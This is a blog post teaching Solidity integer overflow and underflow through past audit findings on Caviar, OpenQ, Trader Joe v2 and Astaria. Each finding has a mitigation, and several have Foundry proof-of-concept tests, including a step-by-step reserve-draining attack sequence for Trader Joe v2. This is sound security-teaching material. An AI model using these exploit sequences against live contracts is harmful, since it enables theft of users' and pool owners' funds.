
Learn attack vectors and explore H/M severity issues. Over/Underflow

In this article, I have gathered an explanation for a very popular vulnerability in Solidity, a few high and medium issues that are not a one-time thing but that you will potentially find in other protocols during your next audits.

And I am adding an exercise to practice what you have learned.

This is part of a series of articles where I am going to go through some of the most popular attack vectors.

Content
Description
Types of high issues
Types of medium issues
Your time to practice
Description

In solidity you’re going to mainly see used uint data types instead of int like in many other programming languages.

What does that imply?

That, as you see in the picture above, when you have a variable of type uint8, means that its maximum value is 2⁸-1, or 255.

And if you add 1 to 255, is not going to be 256 but 0. And that is what it’s known as overflow.

Similarly, if you deduct 1 to a uint8 = 0, and taking into account on uint data type there are only positive numbers, the result will be 255, and this would be an underflow.

Now, this applies to all uint sizes, so don’t think it’s any different with a 2²⁵⁶ with uint256, because for instance adding 3 to its maximum number, 2²⁵⁶ + 3 = 2.

Types of high issues:
— Silent overflow
Title: Risk of silent overflow in reserves update
Project: Caviar Private Pools

Prior information to understand the issue:

What is Silent Overflow?

Occurs when casting is attempted from the larger type that holds a value bigger than the smaller type max value by using, like for example in the case above, a wrapper such as uint128(tokenIds) where tokenIds is previously declared as a uint256.

I wanted to check on Remix how would this look in a very very simple way:
```solidity
function silentOverflow(uint16 num) pure external returns (uint8){
    return uint8(num);
}
```
And passing 1000 as the parameter for the function silentOverflow, it returned me 232.


Now, let’s go to that High issue

Code with vulnerability:
```solidity
function buy(uint256[] calldata tokenIds, uint256[] calldata tokenWeights, MerkleMultiProof calldata proof) 
    public
    payable
    returns (uint256 netInputAmount, uint256 feeAmount, uint256 protocolFeeAmount)
{
    // ~~~ Checks ~~~ //

    // calculate the sum of weights of the NFTs to buy
    uint256 weightSum = sumWeightsAndValidateProof(tokenIds, tokenWeights, proof);

    // calculate the required net input amount and fee amount
    (netInputAmount, feeAmount, protocolFeeAmount) = buyQuote(weightSum);
    ...
    // update the virtual reserves
    virtualBaseTokenReserves += uint128(netInputAmount - feeAmount - protocolFeeAmount); 
    virtualNftReserves -= uint128(weightSum);
    ...
}
function sell(
    uint256[] calldata tokenIds,
    uint256[] calldata tokenWeights,
    MerkleMultiProof calldata proof,
    IStolenNftOracle.Message[] memory stolenNftProofs // put in memory to avoid stack too deep error
) public returns (uint256 netOutputAmount, uint256 feeAmount, uint256 protocolFeeAmount) {
    // ~~~ Checks ~~~ //

    // calculate the sum of weights of the NFTs to sell
    uint256 weightSum = sumWeightsAndValidateProof(tokenIds, tokenWeights, proof);

    // calculate the net output amount and fee amount
    (netOutputAmount, feeAmount, protocolFeeAmount) = sellQuote(weightSum);

    ...

    // ~~~ Effects ~~~ //

    // update the virtual reserves
    virtualBaseTokenReserves -= uint128(netOutputAmount + protocolFeeAmount + feeAmount);
    virtualNftReserves += uint128(weightSum);
 
    ...
}
```
Vulnerability description:

The buy() and sell() functions update the virtualBaseTokenReserves and virtualNftReserves variables during each trade.

However, these two variables are of type uint128, while the values that update them are of type uint256.

This means that casting to a lower type is necessary, but this casting is performed without first checking that the values being cast can fit into the lower type.

As a result, there is a risk of a silent overflow occurring during the casting process.

Impact:

If the reserves variables are updated with a silent overflow, it can lead to a breakdown of the xy=k equation. This, in turn, would result in a totally incorrect price calculation, causing potential financial losses for users or pool owners.

Proof of concept

Consider the scenario with a base token that has high decimals number described in the next test (add it to the test/PrivatePool/Buy.t.sol)
```solidity
function test_Overflow() public {
    // Setting up pool and base token HDT with high decimals number - 30
    // Initial balance of pool - 10 NFT and 100_000_000 HDT
    HighDecimalsToken baseToken = new HighDecimalsToken();
    privatePool = new PrivatePool(address(factory), address(royaltyRegistry), address(stolenNftOracle));
    privatePool.initialize(
        address(baseToken),
        nft,
        100_000_000 * 1e30,
        10 * 1e18,
        changeFee,
        feeRate,
        merkleRoot,
        true,
        false
    );

    // Minting NFT on pool address
    for (uint256 i = 100; i < 110; i++) {
        milady.mint(address(privatePool), i);
    }
    // Adding 8 NFT ids into the buying array
    for (uint256 i = 100; i < 108; i++) {
        tokenIds.push(i);
    }
    // Saving K constant (xy) value before the trade
    uint256 kBefore = uint256(privatePool.virtualBaseTokenReserves()) * uint256(privatePool.virtualNftReserves());

    // Minting enough HDT tokens and approving them for pool address
    (uint256 netInputAmount,, uint256 protocolFeeAmount) = privatePool.buyQuote(8 * 1e18);
    deal(address(baseToken), address(this), netInputAmount);
    baseToken.approve(address(privatePool), netInputAmount);

    privatePool.buy(tokenIds, tokenWeights, proofs);

    // Saving K constant (xy) value after the trade
    uint256 kAfter = uint256(privatePool.virtualBaseTokenReserves()) * uint256(privatePool.virtualNftReserves());

    // Checking that K constant succesfully was changed due to silent overflow
    assertEq(kBefore, kAfter, "K constant was changed");
}
Add this contract as well into the end of Buy.t.sol file for proper test work:

contract HighDecimalsToken is ERC20 {
    constructor() ERC20("High Decimals Token", "HDT", 30) {}
}
```
Mitigation:

Add checks that the casting value is not greater than the uint128 type max value:

File: PrivatePool.sol
229:    // update the virtual reserves
+       if (netInputAmount - feeAmount - protocolFeeAmount > type(uint128).max) revert Overflow();
230:    virtualBaseTokenReserves += uint128(netInputAmount - feeAmount - protocolFeeAmount); 
+       if (weightSum > type(uint128).max) revert Overflow();
231:    virtualNftReserves -= uint128(weightSum);
File: PrivatePool.sol
322:    // update the virtual reserves
+       if (netOutputAmount + protocolFeeAmount + feeAmount > type(uint128).max) revert Overflow();
323:    virtualBaseTokenReserves -= uint128(netOutputAmount + protocolFeeAmount + feeAmount);
+       if (weightSum > type(uint128).max) revert Overflow();
324:    virtualNftReserves += uint128(weightSum);
— Missing validation for a parameter passed to an external function
Title: Adversary can lock every deposit forever by making a deposit with _expiration = type(uint256).max
Project: OpenQ

Prior information to understand the issue:

In Solidity, for an integer type X, you can use type(X).min and type(X).max to access the minimum and maximum value representable by the type.

Code with vulnerability:

function fundBountyToken(
    address _bountyAddress,
    address _tokenAddress,
    uint256 _volume,
    uint256 _expiration,
    string memory funderUuid
) external payable onlyProxy {
    IBounty bounty = IBounty(payable(_bountyAddress));

    ...

    require(bountyIsOpen(_bountyAddress), Errors.CONTRACT_ALREADY_CLOSED);

    (bytes32 depositId, uint256 volumeReceived) = bounty.receiveFunds{
        value: msg.value
    }(msg.sender, _tokenAddress, _volume, _expiration);

    ...
}
Vulnerability description:

DepositMangerV1 allows the caller to specify _expiration which specifies how long the deposit is locked.

An attacker can specify a deposit with _expiration = type(uint256).max which will cause an overflow in the BountyCore#getLockedFunds sub-call and permanently break refunds.

DepositManagerV1’s function fundBountyToken allows the depositor to specify an _expiration which is passed directly to BountyCore’s function receiveFunds().

BountyCore stores the _expiration in the expiration mapping.

expiration[depositId] = _expiration;
When requesting a refund, getLockedFunds returns the amount of funds currently locked.

The line to focus on is depositTime[depList[i]] + expiration[depList[i]]

function getLockedFunds(address _depositId)
    public
    view
    virtual
    returns (uint256)
{
    uint256 lockedFunds;
    bytes32[] memory depList = this.getDeposits();
    for (uint256 i = 0; i < depList.length; i++) {
        if (
            block.timestamp <
            depositTime[depList[i]] + expiration[depList[i]] &&
            tokenAddress[depList[i]] == _depositId
        ) {
            lockedFunds += volume[depList[i]];
        }
    }

    return lockedFunds;
}
An attacker can cause getLockedFunds to always revert by making a deposit in which

depositTime[depList[i]] + expiration[depList[i]] > type(uint256).max
causing an overflow.

To exploit this the user would make a deposit with

_expiration = type(uint256).max

which will cause a guaranteed overflow.

This causes DepositMangerV1’s function refundDeposit to always revert breaking all refunds.

Mitigation:

Add the following check to DepositMangerV1’s function fundBountyToken():

require(_expiration <= type(uint128).max)
— Funds stolen due to an overflow happening inside an unchecked
Title: Attacker can steal entire reserves by abusing fee calculation
Project: Trader Joe v2

Prior information to understand the issue:

What is the purpose of “unchecked” in Solidity?

The reason the “unchecked” keyword exists is to allow Solidity developers to write more efficient programs.

The default “checked” behavior costs more gas when calculating because under the hood those checks are implemented as a series of opcodes that, prior to performing the actual arithmetic, check for under/overflow and revert if it is detected.

So if you’re a Solidity developer who needs to do some math in 0.8.0 or greater, and you can prove that there is no possible way for your arithmetic to under/overflow, then you can surround the arithmetic in an “unchecked” block.

Code with vulnerability:

function _beforeTokenTransfer(
    address _from,
    address _to,
    uint256 _id,
    uint256 _amount
) internal override(LBToken) {
    unchecked {
        super._beforeTokenTransfer(_from, _to, _id, _amount);

        Bin memory _bin = _bins[_id];

        if (_from != _to) {
            if (_from != address(0) && _from != address(this)) {
                uint256 _balanceFrom = balanceOf(_from, _id);

                _cacheFees(_bin, _from, _id, _balanceFrom, _balanceFrom - _amount);
            }

            if (_to != address(0) && _to != address(this)) {
                uint256 _balanceTo = balanceOf(_to, _id);

                _cacheFees(_bin, _to, _id, _balanceTo, _balanceTo + _amount);
            }
        }
    }
}
Vulnerability description:

In Trader Joe users can call mint() to provide liquidity and receive LP tokens, and burn() to return their LP tokens in exchange for underlying assets.

Users collect fees using collectFees(account, binID)

Fees are implemented using the debt model. The fundamental fee calculation is:

function _getPendingFees(
    Bin memory _bin,
    address _account,
    uint256 _id,
    uint256 _balance
) private view returns (uint256 amountX, uint256 amountY) {
    Debts memory _debts = _accruedDebts[_account][_id];

    amountX = _bin.accTokenXPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET) - _debts.debtX;
    amountY = _bin.accTokenYPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET) - _debts.debtY;
}
accTokenXPerShare and accTokenYPerShare is an ever-increasing amount that is updated when swap fees are paid to the current active bin.

When liquidity is first minted to user, the _accruedDebts is updated to match current _balance * accToken*PerShare.

Without this step, a user could collect fees for the entire growth of accToken*PerShare from zero to current value.

This is done in _updateUserDebts(), called by _cacheFees() which is called by _beforeTokenTransfer(), the token transfer hook triggered on mint/burn/transfer.

The critical problem lies in _beforeTokenTransfer() condition block

if (_from != _to)
Note that if _fromor _to is the LBPair contract itself, _cacheFees() won’t be called on _from or _torespectively.

This was presumably done because it is not expected that the LBToken address will receive any fees. It is expected that the LBToken will only hold tokens when a user sends LP tokens to burn.

This is where the bug manifests — the LBToken address (and 0 address), will collect freshly minted LP token’s fees from 0 to the current accToken*PerShare value.

Proof of concept

We can exploit this bug to collect the entire reserve assets. The attack flow is:

Transfer amount X to pair
Call pair.mint() with the to address = pair address
call collectFees() with pair address as account -> pair will send to itself the fees! It is interesting that both OZ ERC20 implementation and LBToken implementation allow this, otherwise, this exploit chain would not work
Pair will now think user sent in money, because the bookkeeping is wrong. _pairInformation.feesX.total is decremented in collectFees() but the balance did not change.
Therefore, this calculation will credit the attacker with the fees collected into the pool:

uint256 _amountIn = _swapForY
    ? tokenX.received(_pair.reserveX, _pair.feesX.total)
    : tokenY.received(_pair.reserveY, _pair.feesY.total);
The attacker calls swap()and receives reserve assets using the fees collected.
Attacker calls burn(), passing their own address as _to parameter. This will successfully burn the minted tokens from step 1 and give Attacker their deposited assets.
And here’s the test to add in LBPair.Fees.t.sol for the PoC:

function testAttackerStealsReserve() public {
    uint256 amountY=  53333333333333331968;
    uint256 amountX = 100000;

    uint256 amountYInLiquidity = 100e18;
    uint256 totalFeesFromGetSwapX;
    uint256 totalFeesFromGetSwapY;

    addLiquidity(amountYInLiquidity, ID_ONE, 5, 0);
    uint256 id;
    (,,id ) = pair.getReservesAndId();
    console.log("id before" , id);

    //swap X -> Y and accrue X fees
    (uint256 amountXInForSwap, uint256 feesXFromGetSwap) = router.getSwapIn(pair, amountY, true);
    totalFeesFromGetSwapX += feesXFromGetSwap;

    token6D.mint(address(pair), amountXInForSwap);
    vm.prank(ALICE);
    pair.swap(true, DEV);
    (uint256 feesXTotal, , uint256 feesXProtocol, ) = pair.getGlobalFees();

    (,,id ) = pair.getReservesAndId();
    console.log("id after" , id);


    console.log("Bob balance:");
    console.log(token6D.balanceOf(BOB));
    console.log(token18D.balanceOf(BOB));
    console.log("-------------");

    uint256 amount0In = 100e18;

    uint256[] memory _ids = new uint256[](1); _ids[0] = uint256(ID_ONE);
    uint256[] memory _distributionX = new uint256[](1); _distributionX[0] = uint256(Constants.PRECISION);
    uint256[] memory _distributionY = new uint256[](1); _distributionY[0] = uint256(0);

    console.log("Minting for BOB:");
    console.log(amount0In);
    console.log("-------------");

    token6D.mint(address(pair), amount0In);
    //token18D.mint(address(pair), amount1In);
    pair.mint(_ids, _distributionX, _distributionY, address(pair));
    uint256[] memory amounts = new uint256[](1);
    console.log("***");
    for (uint256 i; i < 1; i++) {
        amounts[i] = pair.balanceOf(address(pair), _ids[i]);
        console.log(amounts[i]);
    }
    uint256[] memory profit_ids = new uint256[](1); profit_ids[0] = 8388608;
    (uint256 profit_X, uint256 profit_Y) = pair.pendingFees(address(pair), profit_ids);
    console.log("profit x", profit_X);
    console.log("profit y", profit_Y);
    pair.collectFees(address(pair), profit_ids);
    (uint256 swap_x, uint256 swap_y) = pair.swap(true,BOB);

    console.log("swap x", swap_x);
    console.log("swap y", swap_y);

    console.log("Bob balance after swap:");
    console.log(token6D.balanceOf(BOB));
    console.log(token18D.balanceOf(BOB));
    console.log("-------------");

    console.log("*****");
    pair.burn(_ids, amounts, BOB);


    console.log("Bob balance after burn:");
    console.log(token6D.balanceOf(BOB));
    console.log(token18D.balanceOf(BOB));
    console.log("-------------");

}
Note that if the contract did not have the entire collectFees code in an unchecked block, the loss would be limited to the total fees accrued:

if (amountX != 0) {
    _pairInformation.feesX.total -= uint128(amountX);
}
if (amountY != 0) {
    _pairInformation.feesY.total -= uint128(amountY);
}
If the attacker would try to overflow the feesX or feesY totals, the call would revert.

Unfortunately, because of the unchecked block feesX or feesY would overflow and therefore there would be no problem for an attacker to take the entire reserves.

Impact

The attacker can steal the entire reserves of the LBPair.

Mitigation:

The code should not exempt any address from _cacheFees().

Even address(0) is important because the attacker can collectFees for the 0 address to overflow the FeesX or FeesY variables, even though the fees are not retrievable for them.

Types of medium issues:
— Assuming all ERC20 tokens have a similar amount of decimals
Title: changeFeeQuote will fail for low decimal ERC20 tokens
Project: Caviar Private Pools

Prior information to understand the issue:

Do all ERC20 tokens have the same amount of decimals?

The answer is no, there are some exceptions:

There are some with a low amount of decimals:
Some tokens have low decimals (e.g. USDC has 6). Even more extreme, some tokens like Gemini USD only have 2 decimals.

This may result in larger than expected precision loss.

example: LowDecimals.sol

There are some with a high amount of decimals:
Some tokens have more than 18 decimals (e.g. YAM-V2 has 24).

This may trigger unexpected reverts due to overflow, posing a liveness risk to the contract.

example: HighDecimals.sol

Vulnerability description:

Private pools have a “change” fee setting that is used to charge fees when a change is executed in the pool (user swaps tokens for some tokens in the pool).

This setting is controlled by the changeFee variable, which is intended to be defined using 4 decimals of precision:

// @notice The change/flash fee to 4 decimals of precision. 
// For example, 0.0025 ETH = 25. 500 USDC = 5_000_000.
uint56 public changeFee;
In the case of an ERC20 this should be scaled accordingly based on the number of decimals of the token.

The implementation is defined in the changeFeeQuote function:

function changeFeeQuote(uint256 inputAmount) public view returns (uint256 feeAmount, uint256 protocolFeeAmount) {
   // multiply the changeFee to get the fee per NFT (4 decimals of accuracy)
   uint256 exponent = baseToken == address(0) ? 18 - 4 : ERC20(baseToken).decimals() - 4;
   uint256 feePerNft = changeFee * 10 ** exponent;

   feeAmount = inputAmount * feePerNft / 1e18;
   protocolFeeAmount = feeAmount * Factory(factory).protocolFeeRate() / 10_000;
}
As we can see in the previous snippet, in case the baseToken is an ERC20,

then the exponent is calculated as ERC20(baseToken).decimals() - 4

The main issue here is that if the token decimals are less than 4, then the subtraction will cause an underflow due to Solidity's default checked math, causing the whole transaction to be reverted.

Such tokens with low decimals exist

One major example is GUSD, Gemini dollar, which has only two decimals.

If any of these tokens are used as the base token of a pool, then any call to the change will be reverted, as the scaling of the charge fee will result in an underflow.

Proof of Concept

In the following test we recreate the “Gemini dollar” token (GUSD) which has 2 decimals and create a Private Pool using it as the base token.

Any call to change or changeFeeQuote will be reverted due to an underflow error.

function test_PrivatePool_changeFeeQuote_LowDecimalToken() public {
    // Create a pool with GUSD which has 2 decimals
    ERC20 gusd = new GUSD();

    PrivatePool privatePool = new PrivatePool(
        address(factory),
        address(royaltyRegistry),
        address(stolenNftOracle)
    );
    privatePool.initialize(
        address(gusd), // address _baseToken,
        address(milady), // address _nft,
        100e18, // uint128 _virtualBaseTokenReserves,
        10e18, // uint128 _virtualNftReserves,
        500, // uint56 _changeFee,
        100, // uint16 _feeRate,
        bytes32(0), // bytes32 _merkleRoot,
        false, // bool _useStolenNftOracle,
        false // bool _payRoyalties
    );

    // The following will fail due an overflow. Calls to `change` function will always revert.
    vm.expectRevert();
    privatePool.changeFeeQuote(1e18);
}
Mitigation:

The implementation of changeFeeQuote should check if the token decimals are less than 4.

And handle this case by dividing by the exponent difference to correctly scale it

chargeFee / (10 ** (4 - decimals))
For example, in the case of GUSD with 2 decimals, a chargeFee value of 5000 should be treated as 0.50.

— Neglecting the transfer fees from some ERC20 tokens
Title: Tokens with fee on transfer are not supported in PublicVault.sol
Project: Astaria

Prior information to understand the issue:

Fees on Transfer

Some tokens take a transfer fee (e.g. STA, PAXG), some do not currently charge a fee but may do so in the future (e.g. USDT, USDC).

The STA transfer fee was used to drain $500k from several balancer pools (more details).

example: TransferFee.sol

Vulnerability description:

Should a fee-on-transfer token be added to the PublicVault, the tokens will be locked in the PublicVault.sol contract. Depositors will be unable to withdraw their rewards.

In the current implementation, it is assumed that the received amount is the same as the transfer amount. However, due to how fee-on-transfer tokens work, much less will be received than what was transferred.

As a result, later users may not be able to successfully withdraw their shares, as it may revert in function _redeemFutureEpoch() part of code:

WithdrawProxy(s.epochData[epoch].withdrawProxy).mint(shares, receiver);
when WithdrawProxy is called due to insufficient balance.

Proof of Concept

Fee-on-transfer scenario:
1. Contract calls transfer from contractA 100 tokens to current contract
2. Current contract thinks it received 100 tokens
3. It updates balances to increase +100 tokens
4. While actually contract received only 90 tokens
5. That breaks whole math for given token

Mitigation

There are two possibilities:

Consider comparing the before and after balances to get the actual transferred amount.
Alternatively, disallow tokens with fee-on-transfer mechanics to be added as tokens.
Your time to practice
Since you have learned the theory and gone through some examples of high and medium severity issues.

It is time for you to practice by using the tool Ethernaut where you actually need to hack a smart contract provided in order to complete the level.

Go ahead and try it to prove to yourself you understand it:

Ethernaut — Hack the smart contract Token.sol

Also, I’ll leave you here my solution to the challenge in case you need it:

My article — “How to solve Ethernaut challenges. Levels 1 to 5”

Make sure you follow me on Twitter https://twitter.com/TheBlockChainer for my latest updates

And subscribe here on Medium to have access to all my articles all the time https://medium.com/@bloqarl/membership

Solidity
Blockchain Development
Smart Contracts
Web3
Cybersecurity
35





Bloqarl
Coinmonks
Written by Bloqarl
864 Followers
·
Writer for 
Coinmonks

| Enhance Web3 Security | Build On-Chain | Master DeFi | If you share my same goals, I share everything I learn. My Twitter https://twitter.com/TheBlockChainer

Follow

More from Bloqarl and Coinmonks
Save over a HUNDRED THOUSAND gas with this Solidity Gas Optimization tip
Bloqarl
Bloqarl

Save over a HUNDRED THOUSAND gas with this Solidity Gas Optimization tip
Booleans are more expensive than uint256 or any type that takes up a full word because each write operation emits an extra SLOAD to first…

·
4 min read
·
Jul 28
23



Less Than 100 XRP Needed to Become a Millionaire?
Crypto Beat
Crypto Beat

in

Coinmonks

Less Than 100 XRP Needed to Become a Millionaire?
Valhil Capital, a prominent private equity firm, recently released a groundbreaking research paper that delves into the fair value of XRP.

·
4 min read
·
Jun 12
4.1K

22



Bitcoin: The Game Has Changed
Johnwege
Johnwege

in

Coinmonks

Bitcoin: The Game Has Changed
The game has changed, Bitcoin has gone through a transformation and will never be the same again. All of this sounds great, but all of this…

·
4 min read
·
Jul 28
298

4



The ultimate way to boost your Smart Contract Audit skills —  I am Shadow Auditing.
Bloqarl
Bloqarl

The ultimate way to boost your Smart Contract Audit skills —  I am Shadow Auditing.
The time arrived, I’ve embraced it and I am determined to improve my auditing skills not only by reading reports but by doing shadow…

·
3 min read
·
Jul 24
23



See all from Bloqarl
See all from Coinmonks
Recommended from Medium
Solidity vulnerabilities #1: Reentrancy attacks — Let’s understand them and prevent them.
Bloqarl
Bloqarl

Solidity vulnerabilities #1: Reentrancy attacks — Let’s understand them and prevent them.
Firstly, I am going to help you understand in a simple way what is a reentrancy attack and how you can prevent it, and then…

·
8 min read
·
Feb 28
75



My Review of Part 1 of JohnnyTime’s Smart Contract Hacking Course
James Lim
James Lim

in

CoinsBench

My Review of Part 1 of JohnnyTime’s Smart Contract Hacking Course
Week 2— My Journey to Becoming a Smart Contract Auditor

·
6 min read
·
May 21
43



Lists



Modern Marketing
33 stories
·
75 saves
little girl reading a book. She wears glasses.


My Kind Of Medium (All-Time Faves)
39 stories
·
54 saves



Generative AI Recommended Reading
52 stories
·
168 saves



Now in AI: Handpicked by Better Programming
262 stories
·
92 saves
Top 10 YouTube Channels for Learning Smart Contract Auditing & Web3 Security
UNSNARL
UNSNARL

Top 10 YouTube Channels for Learning Smart Contract Auditing & Web3 Security
In the rapidly evolving world of decentralized finance and blockchain technology, understanding smart contract auditing and Web3 security…
5 min read
·
Aug 10
8

1



All Major Blockchain Consensus Algorithms explained
Learn With Whiteboard
Learn With Whiteboard

All Major Blockchain Consensus Algorithms Explained
Understanding the Different Types of Blockchain Consensus Mechanisms
22 min read
·
Apr 2
574

4



EIPs Explained: EIP-2612
AfterDark Labs
AfterDark Labs

EIPs Explained: EIP-2612
Background
6 min read
·
Jul 14
4



I took Google’s Cybersecurity Certification Course and Here’s What I Learned.
Left4Zed
Left4Zed

in

Maveris Labs

I took Google’s Cybersecurity Certification Course and Here’s What I Learned.
I took the Google Cybersecurity Certification Program and I recommend it, here’s my feedback.
10 min read
·
May 31
77

1



See more recommendations
Help

Status

Writers

Blog

Careers

Privacy

Terms

About

Text to speech

Teams
